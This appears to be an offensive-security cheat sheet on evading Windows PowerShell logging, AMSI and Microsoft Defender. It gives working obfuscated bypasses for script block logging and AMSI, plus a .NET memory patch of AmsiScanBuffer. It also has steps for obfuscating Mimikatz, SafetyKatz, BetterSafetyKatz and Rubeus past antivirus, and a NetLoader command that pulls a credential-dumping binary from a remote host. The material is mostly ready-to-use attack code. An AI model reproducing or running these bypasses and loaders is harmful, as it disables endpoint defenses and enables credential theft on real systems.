### Offensive Powershell
#### Detection
- System-wide transcription
- Script Block logging
- AntiMalware Scan Interface (AMSI)
- Constrained Language Mode (CLM) - Integrated w/ Applocker & WDAC (Device Guard)

#### Bypass
- Invisi-Shell
- AMSITrigger
- DefenderCheck

__Invisi-Shell__
- Bypasses AMSI, System-wide transcription & script block logging
- Hooks .NET assemblies (System.Management.Automation.dll & System.Core.dll) to bypass logging
- CLR Profiler API is used perform the hook
- _CLR profiler_ is a dll that receives and send messages to the CLR by using API
- _CANNOT BE USED IN REVERSE SHELL SITUATIONS_

Using:
- RunwithPathAsAdmin.bat
- RunwithRegistryNonAdmin.bat (Use this preferably)

__AMSITrigger__
```powershell
AmsiTrigger_x64.exe -i PowerUp.ps1
```
- Reverse the string
```powershell
$string = 'niamoDppA.metsys'
$classrev = ([regx]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) - join ''
```

__Script Block Bypass__
```powershell
[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
```

__AMSI Powershell Bypass__
```powershell
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) (
[TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (
('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"((
"{6}{3}{1}{4}{2}{0}{5}" -
f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation
.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -
f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f
('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"(
${n`ULl},${t`RuE} )
```

#### Invoke-Mimikatz
- Remove default comments
- Rename script, variables, functions
- Obfuscate PE Bytes content -> Obfuscate PowerKatz dll using _protectMyTooling_
- Convert powerkatz dll into base64 & reverse it again
- Add sandbox check to waster dynamic analysis resources
- Remove reflective PE warnings
- Use obfuscated commands `Invoke-Mimmi -Command $sfsd`
	- `$sfsd = $a + $b`
	- `$a="s"; $b="Eku"`
- Analysis using DenfenderCheck
- DefenderCheck

---
### Offensive C\#
#### Bypass
__DefenderCheck.exe__
```powershell
DefenderCheck.exe <binaty>
```
- Replace strings names


__Out-CompressedDll.ps1 (SafetyKatz)__
```powershell
out-compressedDll <binay> out.txt
```
- Replace _compressedMimikatzString_ variable in "Constants.cs" of SafetyzKatz fe
- Replace byte size in "Program.cs" file on line 111 & 116

__BetterSafetyKatz__
- Download "mimikatz_trunk.zip"
- Convert into base64
```powershell
$f = "mimikatz_trunk.zip"
[convert]::ToBase64String([IO.File]::ReadAllBytes($f)) | clip
```
- Modify "program.cs" of BetterSafetyKatz:
	- Add a variable to store above base64 value
	- Comment the code that downloads & accepts mimikatz file
	- Add this after zipstream, `zipStream = Convert.FromBase64String(base64value)`

__ConfuserEx (Rubeus.exe)__
- In project tab, select base directory
- In project tab, select binary file
- In settings tab, add rules
- In settings tab, edit the rule and select the preset as 'Normal'
- In protect tab, click on protect

__.NET AMSI Bypass__
```powershell
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string
procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr
dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $ZQCUW
$BBWHVWQ =
[ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115
;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ,
"$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97
;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
```

#### Payload Delivery
__NetLoader__
- Patches AMSI & ETW while executing
```powershell
NetLoader.exe -path $IP/safetykatz.exe
```


